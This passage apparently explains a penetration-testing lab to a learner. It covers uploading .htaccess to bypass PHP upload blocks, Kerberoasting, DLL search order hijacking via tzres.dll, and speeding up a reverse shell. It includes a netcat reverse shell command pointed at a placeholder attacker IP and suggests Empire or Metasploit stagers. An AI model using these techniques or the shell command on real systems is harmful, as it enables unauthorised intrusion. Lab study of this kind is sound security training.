### 2. Deep Dive: Why these specific techniques?

#### Why `.htaccess`?
Normally, Windows servers use IIS (web.config). However, because this lab uses **XAMPP**, it uses **Apache**. Apache looks for `.htaccess` files to override folder rules. 
* **The Rule:** If you have an upload folder on Apache that blocks `.php`, the very first thing you test is if you can upload a `.htaccess` to change the `AddType`.

#### Why Kerberoasting?
In an AD environment, if you have a shell but no clear path to Admin, Kerberoasting is the **low-hanging fruit**. It doesn't require high privileges to perform.
* **The Rule:** Any account with an SPN (Service Principal Name) can have its ticket requested by **any** authenticated user in the domain.

#### Why `tzres.dll`?
This is a technique called **DLL Search Order Hijacking**. When `systeminfo.exe` runs, it looks for `tzres.dll`. If it doesn't find it in the "safe" locations, it looks in `C:\Windows\System32\wbem`. Since your exploit made that folder writable, you "planted" a fake DLL there.

### 3. Improving Shell Reaction (The "Lag" Issue)

The slowness you felt is likely due to how **XAMPP/Apache** handles the PHP reverse shell on Windows. PHP shells on Windows are notoriously unstable and slow because they create a new process for every single command.

**How to improve it:**
1.  **Use a Better Shell:** Instead of a basic PHP reverse shell, use the PHP shell to execute a **PowerShell Empire** or **Metasploit HTTPS** stager if allowed.
2.  **The "Netcat Upgrade":** As soon as you got the `svc_apache` shell, you should have uploaded a dedicated Windows `nc.exe` and triggered a *new* shell:
    * `C:\uploads\nc.exe -e cmd.exe <KALI_IP> <PORT>`
    * A native `.exe` shell is always faster than a PHP-wrapped shell.
3.  **Check the Lab Location:** If you are in Singapore but the lab server is in the US/Europe, "Network Latency" is unavoidable. Using a native `nc.exe` shell helps mitigate this.
